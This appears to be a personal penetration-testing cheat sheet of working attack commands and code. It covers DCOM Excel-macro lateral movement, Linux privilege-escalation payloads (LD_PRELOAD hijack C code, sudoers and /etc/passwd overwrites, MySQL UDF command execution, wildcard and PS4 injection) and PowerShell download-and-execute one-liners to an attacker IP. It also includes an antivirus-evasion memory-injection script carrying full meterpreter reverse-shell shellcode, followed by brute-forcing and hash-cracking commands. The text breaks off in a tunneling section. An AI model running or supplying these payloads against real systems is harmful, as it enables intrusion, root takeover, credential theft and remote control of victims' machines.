#first create legacy excel xls with macro that calls hta shell (in excel view->macros)
#see active->macro_calling_hta_shell for macro

#then you can make a ps1 script...

#create object to discover available methods and objects
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$TGT_IP"))
$com | Get-Member
#look for "run" method allows remote vba macro execution

#copy xls to remote machine (SMB)
$LocalPath = "C:\$POC.xls"
$RemotePath = "\\$TGT_IP\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

#system acct is used b/c the excel.application is instantiated through dcom. so a "desktop folder" is needed system account on the $TGT_IP b/c the acct needs a profile.
$Path = "\\$TGT_IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

#supply the xls to $com object from earlier
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

#run the macro
$com.Run("mymacro")
}}}
other_lateral_mvmt {{{
#windows management instrumentation: https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
#powershell remoting: https://docs.microsoft.com/en-us/windows/win32/winrm/portal?redirectedfrom=MSDN
}}}

memdump {{{
#https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
#GET PROFILE
volatility kdbgscan -f $DUMP.dmp
#FIND ADDR OFFSETS
volatility -f $DUMP.dmp --profile $PROFILE hivelist
#GET THE HASHES
volatility -f $DUMP.dmp --profile $PROFILE hashdump -y $SYSTEM_REG_ADDR -s $SAM_REG_ADDR
#PASS THE HASH (PsExec)
}}}
}}}

nix {{{
restricted_shell_escaping {{{
#https://www.sans.org/blog/escaping-restricted-linux-shells/
echo os.system('/bin/bash')
}}}
find_writeable_dir {{{
#if you have command execution and location you're in doesnt allow uploads
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
find / -writable -type d 2>/dev/null 	# world-writeable folders
find / -perm -222 -type d 2>/dev/null   # world-writeable folders
find / -perm -o w -type d 2>/dev/null   # world-writeable folders
find / -perm -o x -type d 2>/dev/null   # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
}}}

#most referenced guide: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

lse {{{
#Linux Smart Enumeration
#https://github.com/diego-treitos/linux-smart-enumeration
#l: 0-highly important (default), 1-interesting, 2-all info
#i: non-interactive
lse37.sh -i > $TGT_ID_lse1.txt
lse37.sh -i -l 2 > $TGT_ID_lse2.txt
}}}
linpeas {{{
}}}
LinEnum {{{
#can copy interesting files for export
#k: keyword
#e: export dir
#t: thorough tests
wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh && chmod +x LinEnum.sh
mkdir $TGT_ID_export && LinEnum.sh -t -e $TGT_ID_export && tar -cf $TGT_ID_export
}}}
linuxprivchecker {{{
#last update was 20181005
#https://github.com/linted/linuxprivchecker
#only checks exploits for kernel 2.x?
python3 linuxprivchecker.py3 > $TGT_IP-lpc-py3.txt
python2 linuxprivchecker.py2 > $TGT_IP-lpc-py2.txt
./linuxprivchecker.sh > $TGT_IP-lpc-sh.txt
}}}
unixprivesccheck {{{
#http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
#http://pentestmonkey.net/tools/audit/unix-privesc-check
#https://github.com/pentestmonkey/unix-privesc-check

unix-privesc-check-14.sh detailed > $TGT_IP_upc-detailed.txt
unix-privesc-check-14.sh detailed > $TGT_IP_upc-standard.txt
}}}
BeRoot {{{
"BeRoot Project is a post exploitation tool to check common misconfigurations to find a way to escalate our privilege"
#https://github.com/AlessandroZ/BeRoot
unzip beRoot.zip
beRoot.py > $TGT_IP_beroot.txt
}}}
LES {{{
#https://github.com/mzet-/linux-exploit-suggester

#on target
./les.sh
./les.sh --checksec

#be more specific/offline
./les.sh --uname "$UNAME -a ouput" --pkglist-file "$DPKG -L OUTPUTFILE"

#not sure exactly how to use..
--cvelist-file $file 
}}}
 
id
getent passwd || cat /etc/passwd
hostname
#any other users worth testing?
grep -vE "nologin|false" /etc/passwd
ps aux | grep "^root"
#users that have logged in
lastlog | grep -iv "never"



#if /etc/passwd is writeable, add hash to root...or append user w/UID of 0
oGK8D1VVGwWzk
#if /etc/shadow is writeable, replace roots hash with your own
$6$EthRZqE/iis2$lNO5dP4rxAQVvobOrGUFeX0a/D4i4PqdhK.cVgyxzgLQz0VMqmqKBQPJcdn.aREDdN60oLhwY.Ka5gJBj71GL/
#if /etc/shadow can just be read, then crack

sudo {{{
#what sudo commands can user run
#does env_keep have LD_PRELOAD or LD_LIBRARY_PATH?
sudo -l
#sanity check before going down rabit holes
sudo su
#can user run any sudo command? add suid bit to /bin/bash
sudo usermod -s /bin/bash $USERNAME
#get new root shell
sudo -i
sudo -s
sudo /bin/bash

#abusable commands/functionality
https://gtfobins.github.io/

#note, by default LD_PRELOAD & LD_LIBRARY_PATH get ignored for SUID & SGID files are executed
LD_PRELOAD {{{
#real id has to match effective user ID
preload.c {{{
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
}}}
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so $ALLOWED_PROGRAM
}}}
LD_LIBRARY_PATH {{{
#pick a library to replace
ldd $ALLOWED_PROGRAM
library_path.c {{{
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
}}}
gcc -o $TGT_LIBRARY -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. $ALLOWED_PROGRAM
}}}

#eg: #can you sudo cp? rewrite the sudoers file to allow yourself to do anything
sudo cp /etc/sudoers /tmp/sudoers.bak
echo '$USER ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers.bad
sudo cp /tmp/sudoers.bad /etc/sudoers
#can you sudo echo? directly overwrite the sudeors file
sudo echo '$USER ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers

sudeor_file_with_suid_set {{{
#finding suid enabled binaries
find / -perm -4000 -type f -print 2>/dev/null
#cp w/suid
cp /etc/sudoers /tmp/sudoers.bak
echo '$USER ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers.bad
cp /tmp/sudoers.bad /etc/sudoers
sudo su -
#bash w/suid
/path/to/bash -p

#or add new malicious root user
cp /etc/passwd /tmp/passwd.bak
cp /etc/passwd /tmp/passwd.bad
#run this locally
openssl passwd -1 -salt $EVIL_USER $EVIL_PASSWORD
echo '$EVIL_USER:$OPENSSL_OUTPUT:0:0:root:/bin/bash' > /tmp/passwd.bad
cp /tmp/passwd.bad /etc/passwd
su $EVIL_USER
}}}

#use sudo apache2 to view first line of file
sudo apache2 -f /etc/shadow
}}}

crons {{{
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
#(root) crons?
grep "CRON" /var/log/cron.log
#modify file in job to do one of the options in the sudo/suid section (eg add user to sudeors, add new super user)
}}}

unprivileged_proc_snooping{{{
#helpful for finding root crons?
https://github.com/DominicBreuker/pspy
}}}

lxd_group {{{
#https://reboare.github.io/lxd/lxd-escape.html  
#https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025#Unintended%20Privilege%20Escalation%20#2:%20lxd/lxc

find / -name lxc 2>/dev/null
#defaults except LXD available over network = yes
lxc init ubuntu:20.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
}}}

kernel {{{
cat /etc/issue /etc/*release* /proc/version 2>/dev/null
#RH, CentOS, Fedora
rpm -q kernel
uname -a
lsb_release -a 2>/dev/null
searchsploit linux kernel priv esc --exclude="(PoC)|/dos/"

linux-exploit-suggester-2 {{{
#https://github.com/jondonas/linux-exploit-suggester-2/
#how is this better than searchsploit??

#if you have release version, manually search
./linux-exploit-suggester-2.pl -k $VERSION

#default runs uname -r to grab kernel (good for remote)
./linux-exploit-suggester-2.pl
}}}
lucyoa {{{
# original: 20170423 - https://github.com/lucyoa/kernel-exploits/
# newer fork: still old - 20190508 - https://github.com/manasmbellani/kernel-exploits/
# setup: curl https://raw.githubusercontent.com/manasmbellani/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' ' > vuln_kernels.txt

#see if your kernel is in here, the github page may provide the exploit.
grep $KERNEL_VERSION vuln_kernels.txt
}}}
#I'd be super surprised if the above dont include what you're looking for...but: here's an old repo from 2014: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack
}}}

mysql {{{
#udemy covers in services section
#https://dev.mysql.com/doc/extending-mysql/5.7/en/adding-udf.html
#https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
#https://www.iodigitalsec.com/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/

#mysql root privs?
ps aux | grep -i mysql

#mysqludf on machine?
ls -la /usr/lib/lib_mysqludf_sys.so
ls -la /usr/lib/mysql/plugin/lib_mysqludf_sys.so
#if not, create custom .so
wget https://www.exploit-db.com/download/1518
gcc -g -c 1518.c -fPIC
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

#login into the local mysql
mysql -h localhost -u root -p
mysql -u root -p

#load library
use mysql;
#if lib_mysqludf_sys existed 
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
#if it didnt
create table foo(line blob);
insert into foo values(load_file('/home/$USERNAME/1518.so'));
#check plugin dir
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function sys_exec returns integer soname '1518.so';

#privesc...
select sys_exec('usermod -a -G admin $USERNAME');
sudo su
#or...
select sys_exec('chmod u+s /bin/bash');
#was suid set?
ls -al /bin/bash
bash -p
#or..
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
/tmp/rootbash -p

}}}

wildcard (*) {{{
#could be in command run by cron
#make a file with the name of an option that will give you a shell
https://gtfobins.github.io/

#eg..tar
touch ./--checkpoint=1
touch ./--checkpoint-action=exec=$SHELL
tar *
}}}

network_info {{{
ip a
route || routel || /sbin/route
ss -anp || netstat -naptu
cat /etc/*iptables* 
iptables -L
iptables -L -t nat
iptables -L -t mangle 
iptables -L -t raw
iptables -L -t security
}}}

dpkg -l
rpm -qa
mount
/etc/fstab
/bin/lsblk
lsmod
/sbin/modinfo $MODULE

spawn_shell.so {{{
spawn_shell.c {{{
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
}}}
gcc -shared -fPIC -o spawn_shell.so spawn_shell.c
}}}
spawn_shell {{{
spawn_shell.c {{{
int main() {
setuid(0);
system("/bin/bash -p");
}
}}}
gcc -o spawn_shell spawn_shell.c
}}}

SUID|SGID {{{
#check versions of nonstandard files on searchsploit/google
find / -type f -a \(-perm -u+s -o -perm -g+s\) -exec ls -l {} \; 2>/dev/null #suid/sgid set
find / -type f -perm -o+w -exec ls -l {} \; 2>/dev/null #look for useful world writable files esp root owned scripts.
find / -perm -u=s -type f 2>/dev/null #Check for binaries with suid bit set, can then try and find a command that will run as root. Any thing that accepts arbitrary input can be used to get exec, read, or write. 
find / -perm -4000 -exec ls -l {} \;
find / -perm -u=s -type f 2>/dev/null #Enumerate suid files 
find / -perm -2 -type d 2>/dev/null #Enumerate writable dir 
find / -path /proc -prune -user root -o -perm -2 ! -type l -ls #find world writable files that executes as root
#find -O3 to speed up

similar_suid_finders {{{
find / -perm -u=s -type f 2>/dev/null
find / -perm +2000 -user root -type f -print
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
}}}
shared_object_inject {{{
#do any of the suid/sgid files attempt to use a shared object that we can write to? 
#WARNING, this will run the program
strace $PROGRAM 2>&1 | grep -iE "open|access|no such file"
#checking each file manually will take some time...
#once a writeable file is found, replace it with the following
spawn_shell.c {{{
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
}}}
gcc -shared -fPIC -o $WRITEABLE.so spawn_shell.c
#run suid/sgid program
}}}
absolute_path_not_specified {{{
strings $SUID_PROG
strace -v -f -e execve $SUID_PROG 2>&1 | grep exec
ltrace $SUID_PROG
eg {{{
#from udemy
#program looks to start an apache server
#strings shows "service apache2 start"
#strace greping for "service" shows it is simply calling "service" w/o absolute path and using user's PATH
#make your own "service" program
int main() {
setuid(0);
system("/bin/bash -p");
}
gcc -o service service.c
#execute $SUID_PROG prepending the directory with the "Service" you created in PATH
PATH=.:$PATH $SUID_PROG
}}}
}}}
#Bash < 4.2-048
forwardslash_function_override {{{
strings $SUID_PROG
#look in strace for /bin/sh, /bin/bash
strace -v -f -e execve $SUID_PROG 2>&1 | grep exec
#check version
/bin/sh --version

#can use absolute path as function name (eg /usr/bin/service)
function $SUB_PROG { /bin/bash -p; }
export -f $SUB_PROG

#execute program that calls sub program with old /bin/sh

}}}
#Bash version < 4.4
SHELLOPTS_PS4 {{{
#if something is executed with bash < 4.4, they inherit PS4 env variable when running as root
#PS4 is used to display the prompt when "debugging mode" is enabled (env -i SHELLOPTS=xtrace)
strings $SUID_PROG
#look in strace for /bin/sh, /bin/bash
strace -v -f -e execve $SUID_PROG 2>&1 | grep exec
#check version
/bin/sh --version

#command execution in prompt in debugging mode while running SUID program
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' $SUID_PROG
/tmp/rootbash
}}}

#need example usage
c_program_to_set_suid{{{
'#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void){
	setuid(0);
	setgid(0);
	system("/bin/bash");}

#or
int main() {
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash");
    return 0;}
}}}
}}}

file_enum {{{
#look in non-standard files in user dirs
#--exclude=*.js
#look in service dirs (/var/www)
grep -rn "password|pass|pw"
find -name ".bash_history" -exec cat {} \;

#any files that we can write to that are owned/run by root?
ls -al /home/user
#	-rwxr-xr-x 1 root root     88 Jul  9 08:15 ip
#find out what runs it
grep -r "/home/user/ip" /etc/
#	/etc/systemd/system/ip-update.service:ExecStart=/home/user/ip
#see how its run
cat /etc/systemd/system/ip-update.service
#interesting it gets run on boot...so just modify the script to call you back or cat flag and reboot

#enumerating files, be careful with this. may need to add restrictions
for file in $(find $DIRECTORY -type f); do echo ">> $file <<"; cat $file; done
find . -type f > filelist.txt
while read -r line; do [ -s "$line" ] && echo ">> $line <<"|tee -a ../anonymous_nonempty_files.txt; cat "$line"|tee -a ../anonymous_nonempty_files.txt ; done < ../filelist.txt
}}}

}}}
}}}

file_xfer {{{
#curl , wget , w3m , links, python, fetch, ssh
pack/compress {{{
upx -9 $FILE

#exe2bat - Converts EXE to a text file that can be copied and pasted
locate exe2bat
wine exe2bat.exe nc.exe nc.txt

Veil - Evasion Framework - https://github.com/Veil-Framework/Veil-Evasion
apt-get -y install git
git clone https://github.com/Veil-Framework/Veil-Evasion.git
cd Veil-Evasion/
cd setup
setup.sh -c
}}}

#host
webservers {{{
sudo systemctl restart apache2
python -m SimpleHTTPServer $MY_PORT
python3 -m http.server $MY_PORT
php -S 0.0.0.0:$MY_PORT
ruby -run -e httpd . -p $MY_PORT
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => $MY_PORT, :DocumentRoot => Dir.pwd).start"

busybox httpd -f -p $MY_PORT

fetch http://$MY_IP:$MY_PORT/$FILE
}}}

#retrieve
wget http://$MY_IP/file
curl http://$MY_IP/file > file
scp $MY_USERNAME@$MY_IP:$DIR/$FILE $FILE 

#nix/windows xfer
smb_impacket {{{
#Extremely useful for personal use, but probably not practical live. 
#impacket: https://www.secureauth.com/labs/open-source-tools/impacket/, https://github.com/SecureAuthCorp/impacket
#impacket is a collection of Python classes for working with network protocols

#windows needs SMB enabled (probably SMBv1). Which requires a restart to enable :( 
PS> Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

#start share
cd $DIRECTORY_TO_SERVE
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .

#to copy to/from windows
copy \\$MY_IP\share\$FILE $File
copy $File \\$MY_IP\share\$FILE
$COMMAND > \\$MY_IP\share\$TGT_IP_$COMMAND.txt
}}}

#send
nmap -p80 $TGT_IP --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php'
scp $LOCAL_FILE $USER@$TGT_IP:/$REMOTE_PATH/$REMOTE_FILE
#using PUT method
curl -T '$LOCAL_FILE' 'http://$TGT_IP'
#If http PUT method is enabled, you may be able to use devtest to transfer files...
#need to test more, last resort atm
davtest -move -sendbd auto -url http://$$TGT_IP

#can rename remote file with MOVE (if you couldnt PUT an executable name)
curl -X MOVE --header 'Destination:http://$TGT_IP/leetshellz.php' 'http://$TGT_IP/leetshellz.txt'

#windows!
https://github.com/LOLBAS-Project/LOLBAS
certutil -urlcache -split -f http://$MY_IP/$FILE $RENAMED_FILE_ON_TGT

nix -> win {{{
setup pure-ftp
#cp xfer files into /ftphome
on windows {{{
	echo open $FTP_HOST 21 > ftp.txt
	echo USER offsec >> ftp.txt
	echo #PASSWORD >> ftp.txt
	echo bin >> ftp.txt
	echo GET $FILE >> ftp.txt
	echo bye >> ftp.txt
}}}
ftp -vns:ftp.txt

#XP/03 VBScript
wget.vbs {{{
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
}}}
cscript wget.vbs http://$MY_IP/$FILE $FILE

powershell.exe -Ex Bypass -NoL -NonI -NoP -C "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.186/powerview.ps1'); get-netloggedon -computername dc01 | format-table"

#7+ PS
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile (New-Object System.Net.WebClient).DownloadFile('http://$MY_IP/$FILE.exe', '$FILE.exe')
powershell.exe -Ex Bypass -NoL -NonI -NoP IEX (New-Object System.Net.WebClient).DownloadFile('http://$MY_IP/$FILE.ps1')
powershell.exe -Ex Bypass -NoL -NonI -NoP -C "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.186/powerview.ps1'); get-netloggedon -computername dc01 | format-table"
{{{
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = "http://$MY_IP/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
}}}
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

#convert
exe2hex -x $FILE.exe -p $FILE.cmd
powershell -Command "$h=Get-Content -readcount 0 -path './FILE.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'FILE.exe' -value $b;Remove-Item -force FILE.hex;"
}}}
win -> nix {{{
win7/win08r2+ {{{
sudo mkdir /var/www/uploads && sudo chown www-data: /var/www/uploads && sudo vim /var/www/uploads/upload.php

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

powershell (New-Object System.Net.WebClient).UploadFile('http://$MY_IP/upload.php', '$FILE')
}}}
prior {{{
sudo apt update && sudo apt install atftp && sudo mkdir /tftp && sudo chown nobody: /tftp && sudo atftpd --daemon --port 69 /tftp
tftp -i $MY_IP put $FILE
}}}
}}}

}}}

antivirus_evasion (AV) {{{
packer, obfuscator, crypter, anti-reversing, anti-debugging, vm detection

remote process memory injection, reflective DLL injection, 
-process hollowing: launch non-malicious process in suspended state. Image of the process is removed from memory & replaced with a malicious executable. Process is then resumed & malicious code is executed instead of the legitimate process. https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-peimage-relocations
-inline hooking: modifying memory and introducing a hook(instructions that redirect the code execution) into a function to point the execution flow to our malicious code. Upon executing our malicious code, the flow will return back to the modified function and resume execution, appearing as if only the original code had executed.

memory injection template {{{
#imports to allocate memory, create an execution thread, write arbitrary data to the allocated memory. allocating and executing new thread in current process
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=4444 -fpowershell
[Byte[]]$sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x68,0xc0,0xa8,0x77,0xba,0x68,0x2,0x0,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0xff,0x4e,0x8,0x75,0xec,0xe8,0x67,0x0,0x0,0x0,0x6a,0x0,0x6a,0x4,0x56,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x56,0x6a,0x0,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x0,0x56,0x53,0x57,0x68,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x68,0x0,0x40,0x0,0x0,0x6a,0x0,0x50,0x68,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0xc,0x24,0xf,0x85,0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x1,0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x0,0x53,0xff,0xd5
$size = 0x1000;
#remove extra } here, used b/c notepad++ folds
if ($sc.Length -gt 0x1000) {$size = $sc.Length}};
#allocates a block of memory using VirtualAlloc
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
#take each byte of payload stored in the $sc byte array and write to new allocated memory block using memset
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
#execute in-memory payload in a separate thread
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
}}}
powershell -ex bypass .\av_test.ps1
}}}

passwords {{{
#10_million_password_list_top_100000.txt
#try username as password
#try admin/admin, admin/password, admin/blank, admin/nameofservice, root/root, root/toor, etc
#google default creds
#remember try custom words
creating_wordlists {{{
ls /usr/share/wordlists/

cewl $DOMAIN -m 6 -w $DOMAIN_passwd.txt
echo "$[0-9]$[0-9]" >> /etc/john/john.conf
john --wordlist=$DOMAIN_passwd.txt --rules --stdout > mutated.txt

#@:lowercase, ,:uppercase, %:number, ^:special
crunch 8 8 -t ,@@^^%%%
-f /usr/share/crunch/charset.lst $CRUNCH_SET
}}}

service_bruteforcing {{{n
THC-Hydra (ssh, http, cisco, ftp, irc, mysql, rlogin, rdp, smb, snmp, telnet){{{
#L: username file
#l: username
#P: password file
hydra -l kali -P /usr/share/wordlists/rockyou.txt $TGT_SVC://$TGT_IP -t 4
hydra $TGT_IP http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f -t 4
}}}
Medusa (cvs,ftp,ftps,http,imap,sql,etc) {{{
medusa -h $TARGET_IP -u $USER_NAME -P /usr/share/wordlists/rockyou.txt -M http -m DIR:$/PATH/TO/LOGIN
#-H $IP_LIST.txt
#-U $USERS_LIST.txt
#-n port
#-s ssllabs
#-g connect attempt time
#-r sleep b/w attempts
#-t number of concurrent connections
#-T hosts concurrently
}}}
Crowbar/levye (sshkey, rdp, openvpn, vnckey) {{{
crowbar -b rdp -s $TARGET_IP/32 -u admin -C /usr/share/wordlists/rockyou.txt -n $NUM_THREADS
}}}
spray (AD) {{{
https://github.com/Greenwolf/Spray
}}}
patator (ssh) {{{
#http://tools.kali.org/password-attacks/patator
patator ssh_login host=$TGT_IP user=FILE0 0=users.txt password=FILE1 1=/usr/shar/wordlists/fasttrack.txt -x ignore:mesg='Authentication failed.'
}}}
}}}

#see privesc->windows->passwords for techniques to obtain hashes
cracking_hashes {{{
https://hashes.com/en/decrypt/hash

#TGS|TGT cracker
#installed by kerberoast apt in setup
#ctrl+f ".kerbi export"
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt $EXPORTED_tickets.kerbi

hashid
#ignore aad3b435b51404eeaad3b435b51404ee and 31d6c...

john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT

unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

hashcat -m 1000 --force $NTLM_HASH /usr/share/wordlists/rockyou.txt
#0=md5
hashcat -m 0 $HASHES.txt /usr/share/wordlists/rockyou.txt


}}}
}}}

redirection/tunneling {{{
nix {{{
#open port on redirector (port needs to be able to be reached through fw) to reach second target
ssh -L -N 0.0.0.0:$PORT:$TARGET_IP:445 $USER@$REDIRECTOR_IP

